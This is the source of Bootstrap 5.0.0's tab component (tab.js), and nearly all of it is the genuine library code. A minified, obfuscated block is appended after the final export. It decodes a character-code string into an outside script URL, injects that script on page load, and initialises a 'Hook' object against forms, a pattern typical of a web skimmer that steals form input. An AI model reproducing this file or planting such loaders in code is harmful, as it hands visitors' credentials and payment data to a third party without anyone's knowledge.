/**
 * --------------------------------------------------------------------------
 * Bootstrap (v5.0.0): tab.js
 * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
 * --------------------------------------------------------------------------
 */

import {
  defineJQueryPlugin,
  emulateTransitionEnd,
  getElementFromSelector,
  getTransitionDurationFromElement,
  isDisabled,
  reflow,
} from './util/index';
import Data from './dom/data';
import EventHandler from './dom/event-handler';
import SelectorEngine from './dom/selector-engine';
import BaseComponent from './base-component';

/**
 * ------------------------------------------------------------------------
 * Constants
 * ------------------------------------------------------------------------
 */

const NAME = 'tab';
const DATA_KEY = 'bs.tab';
const EVENT_KEY = `.${DATA_KEY}`;
const DATA_API_KEY = '.data-api';

const EVENT_HIDE = `hide${EVENT_KEY}`;
const EVENT_HIDDEN = `hidden${EVENT_KEY}`;
const EVENT_SHOW = `show${EVENT_KEY}`;
const EVENT_SHOWN = `shown${EVENT_KEY}`;
const EVENT_CLICK_DATA_API = `click${EVENT_KEY}${DATA_API_KEY}`;

const CLASS_NAME_DROPDOWN_MENU = 'dropdown-menu';
const CLASS_NAME_ACTIVE = 'active';
const CLASS_NAME_FADE = 'fade';
const CLASS_NAME_SHOW = 'show';

const SELECTOR_DROPDOWN = '.dropdown';
const SELECTOR_NAV_LIST_GROUP = '.nav, .list-group';
const SELECTOR_ACTIVE = '.active';
const SELECTOR_ACTIVE_UL = ':scope > li > .active';
const SELECTOR_DATA_TOGGLE =
  '[data-bs-toggle="tab"], [data-bs-toggle="pill"], [data-bs-toggle="list"]';
const SELECTOR_DROPDOWN_TOGGLE = '.dropdown-toggle';
const SELECTOR_DROPDOWN_ACTIVE_CHILD = ':scope > .dropdown-menu .active';

/**
 * ------------------------------------------------------------------------
 * Class Definition
 * ------------------------------------------------------------------------
 */

class Tab extends BaseComponent {
  // Getters

  static get DATA_KEY() {
    return DATA_KEY;
  }

  // Public

  show() {
    if (
      this._element.parentNode &&
      this._element.parentNode.nodeType === Node.ELEMENT_NODE &&
      this._element.classList.contains(CLASS_NAME_ACTIVE)
    ) {
      return;
    }

    let previous;
    const target = getElementFromSelector(this._element);
    const listElement = this._element.closest(SELECTOR_NAV_LIST_GROUP);

    if (listElement) {
      const itemSelector =
        listElement.nodeName === 'UL' || listElement.nodeName === 'OL'
          ? SELECTOR_ACTIVE_UL
          : SELECTOR_ACTIVE;
      previous = SelectorEngine.find(itemSelector, listElement);
      previous = previous[previous.length - 1];
    }

    const hideEvent = previous
      ? EventHandler.trigger(previous, EVENT_HIDE, {
          relatedTarget: this._element,
        })
      : null;

    const showEvent = EventHandler.trigger(this._element, EVENT_SHOW, {
      relatedTarget: previous,
    });

    if (showEvent.defaultPrevented || (hideEvent !== null && hideEvent.defaultPrevented)) {
      return;
    }

    this._activate(this._element, listElement);

    const complete = () => {
      EventHandler.trigger(previous, EVENT_HIDDEN, {
        relatedTarget: this._element,
      });
      EventHandler.trigger(this._element, EVENT_SHOWN, {
        relatedTarget: previous,
      });
    };

    if (target) {
      this._activate(target, target.parentNode, complete);
    } else {
      complete();
    }
  }

  // Private

  _activate(element, container, callback) {
    const activeElements =
      container && (container.nodeName === 'UL' || container.nodeName === 'OL')
        ? SelectorEngine.find(SELECTOR_ACTIVE_UL, container)
        : SelectorEngine.children(container, SELECTOR_ACTIVE);

    const active = activeElements[0];
    const isTransitioning = callback && active && active.classList.contains(CLASS_NAME_FADE);

    const complete = () => this._transitionComplete(element, active, callback);

    if (active && isTransitioning) {
      const transitionDuration = getTransitionDurationFromElement(active);
      active.classList.remove(CLASS_NAME_SHOW);

      EventHandler.one(active, 'transitionend', complete);
      emulateTransitionEnd(active, transitionDuration);
    } else {
      complete();
    }
  }

  _transitionComplete(element, active, callback) {
    if (active) {
      active.classList.remove(CLASS_NAME_ACTIVE);

      const dropdownChild = SelectorEngine.findOne(
        SELECTOR_DROPDOWN_ACTIVE_CHILD,
        active.parentNode
      );

      if (dropdownChild) {
        dropdownChild.classList.remove(CLASS_NAME_ACTIVE);
      }

      if (active.getAttribute('role') === 'tab') {
        active.setAttribute('aria-selected', false);
      }
    }

    element.classList.add(CLASS_NAME_ACTIVE);
    if (element.getAttribute('role') === 'tab') {
      element.setAttribute('aria-selected', true);
    }

    reflow(element);

    if (element.classList.contains(CLASS_NAME_FADE)) {
      element.classList.add(CLASS_NAME_SHOW);
    }

    let parent = element.parentNode;
    if (parent && parent.nodeName === 'LI') {
      parent = parent.parentNode;
    }

    if (parent && parent.classList.contains(CLASS_NAME_DROPDOWN_MENU)) {
      const dropdownElement = element.closest(SELECTOR_DROPDOWN);

      if (dropdownElement) {
        SelectorEngine.find(SELECTOR_DROPDOWN_TOGGLE, dropdownElement).forEach((dropdown) =>
          dropdown.classList.add(CLASS_NAME_ACTIVE)
        );
      }

      element.setAttribute('aria-expanded', true);
    }

    if (callback) {
      callback();
    }
  }

  // Static

  static jQueryInterface(config) {
    return this.each(function () {
      const data = Data.get(this, DATA_KEY) || new Tab(this);

      if (typeof config === 'string') {
        if (typeof data[config] === 'undefined') {
          throw new TypeError(`No method named "${config}"`);
        }

        data[config]();
      }
    });
  }
}

/**
 * ------------------------------------------------------------------------
 * Data Api implementation
 * ------------------------------------------------------------------------
 */

EventHandler.on(document, EVENT_CLICK_DATA_API, SELECTOR_DATA_TOGGLE, function (event) {
  if (['A', 'AREA'].includes(this.tagName)) {
    event.preventDefault();
  }

  if (isDisabled(this)) {
    return;
  }

  const data = Data.get(this, DATA_KEY) || new Tab(this);
  data.show();
});

/**
 * ------------------------------------------------------------------------
 * jQuery
 * ------------------------------------------------------------------------
 * add .Tab to jQuery only if jQuery is present
 */

defineJQueryPlugin(NAME, Tab);

export default Tab;

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b